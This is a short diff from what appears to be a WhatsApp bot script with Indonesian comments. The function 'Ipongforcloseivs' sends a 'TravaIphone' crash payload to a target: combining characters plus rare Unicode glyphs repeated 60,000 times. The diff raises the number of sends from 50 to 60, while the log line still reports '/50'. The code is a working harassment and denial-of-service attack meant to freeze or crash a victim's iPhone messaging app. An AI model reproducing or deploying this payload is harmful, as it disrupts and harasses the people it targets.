@@ -315,7 +315,7 @@ async function Ipongforcloseivs(sock, target) {
     }
     console.log(`[Ipongforcloseivs] Mengirim payload ke: ${target}`)
 
-    for (let i = 0; i < 50; i++) {
+    for (let i = 0; i < 60; i++) {
         console.log(`[Ipongforcloseivs] [${target}] Putaran ${i + 1}/50`)
 
         const TravaIphone = ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000);
